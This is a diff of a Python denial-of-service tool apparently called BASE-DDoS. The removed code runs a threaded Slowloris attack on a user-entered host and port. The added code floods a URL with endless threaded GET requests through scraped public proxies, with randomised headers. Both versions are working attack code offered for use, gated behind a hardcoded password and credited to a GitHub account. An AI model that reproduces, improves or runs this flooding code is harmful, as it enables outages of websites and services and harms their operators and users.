@@ -35,54 +35,79 @@ print("""
 ‎\033[96m║\033[95m ——o0o—— \033[96m║
 ‎\033[96m╚════════════════════════════════════════════════
 ‎""")
-‎# Password authentication function
+‎‎# Password authentication function
 ‎def authenticate():
-‎password = "bas3" # The password to access the tool
+‎password = "BASe" # The password to access the tool
 ‎user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
 ‎if user_password != password:
 ‎print("\033[1;31mIncorrect password. Exiting...\033[0m")
 ‎exit()
 ‎
-‎# Optimized Slowloris function with threading for faster execution
-‎def slowloris_thread(target, port):
+‎def check_prox(array, url):
+‎	ip = r.post("http://ip.beget.ru/").text
+‎	for prox in array:
+‎		thread_list = []
+‎		t = threading.Thread (target=check, args=(ip, prox, url))
+‎		thread_list.append(t)
+‎		t.start()
 ‎
-‎try:
-‎s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-‎s.settimeout(4)
-‎s.connect((target, port))
-‎s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
+‎def check(ip, prox, url):
+‎	try:
+‎		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
+‎	except:
+‎		ipx = ip
+‎	if ip != ipx:
+‎		thread_list = []
+‎		t = threading.Thread (target=ddos, args=(prox, url))
+‎		thread_list.append(t)
+‎		t.start()
 ‎
-‎# Faster loop to send partial headers
-‎while True:
-‎s.send(b"X-a: b\r\n")
-‎time.sleep(0.01) # Further reduced delay to make it faster
-‎except socket.error:
-‎print("\033[1;31mConnection error. Could not send data.\033[0m")
-‎return
+‎def ddos(prox, url):
+‎	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
+‎	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
+‎	color = random.choice(colors)
+‎	while True:
+‎		headers = Headers(headers=True).generate()
+‎		thread_list = []
+‎		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
+‎		thread_list.append(t)
+‎		t.start()
 ‎
-‎def slowloris(target, port, num_threads):
-‎for i in range(num_threads):
-‎thread = threading.Thread(target=slowloris_thread, args=(target, port))
-‎thread.start()
-‎print(f"\033[32mSTATUS \033[97mATTACK \033[92mSENT \033[31m:{i + 1} \033[0m")
-‎print(f"\033[92mSTATUS \033[33mATTACK \033[92mSENT \033[94m:{i + 1} \033[0m")
-‎print(f"\033[33mSTATUS \033[96mATTACK \033[94mSENT \033[1m::{i + 1} \033[0m")
-‎if __name__ == "__main__":
-‎clear() 
-‎# Clear the screen before showing anything
-‎ascii_art_Base() # Display the colorful ASCII art for "Base"
+‎def start_ddos(prox, url, headers, proxies, color):
+‎	try:
+‎		s = r.Session()
+‎		req = s.get(url, headers=headers, proxies=proxies)
+‎		if req.status_code == 200:
+‎			print(color+"{}_proxy ".format(prox))
+‎	except:
+‎		pass
 ‎
-‎authenticate() # Authenticate after displaying ASCII art
+‎@click.command()
+‎@click.option('--proxy', '-p', help="File with a proxy")
+‎@click.option('--url', '-u', help="URL")
+‎def main(proxy, url):
+‎	clear()
+‎	logo()
+‎	if url == None:
+‎		url = input("URL: ")
+‎	if url[:4] != "http":
+‎		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
+‎		exit()
+‎	if proxy == None:
+‎		while True:
+‎			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
+‎			array = req.text.split()
+‎			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
+‎			check_prox(array, url)
+‎	else:
+‎		try:
+‎			fx = open(proxy)
+‎			array = fx.read().split()
+‎			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
+‎			check_prox(array, url)
+‎		except FileNotFoundError:
+‎			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
+‎			exit()
 ‎
-‎target = input("\033[1;36mEnter the target IP or domain: \033[0m")
-‎port = int(input("\033[1;36mEnter the port number: \033[0m"))
-‎num_threads = int(input("\033[1;36mEnter the number of threads (more = faster): \033[0m"))
-‎
-‎slowloris(target, port, num_threads)
-‎
-‎print(f"\033[1;31mThank you for using my tool\033[0m")
-‎
-‎print(f"\033[1;31mmy github id: https://github.com/KunFay99/BASE-DDoS\033[0m")
-‎
-‎print(f"\033[1;31mpress ctrl + z\033[0m")
+‎main()
 ‎
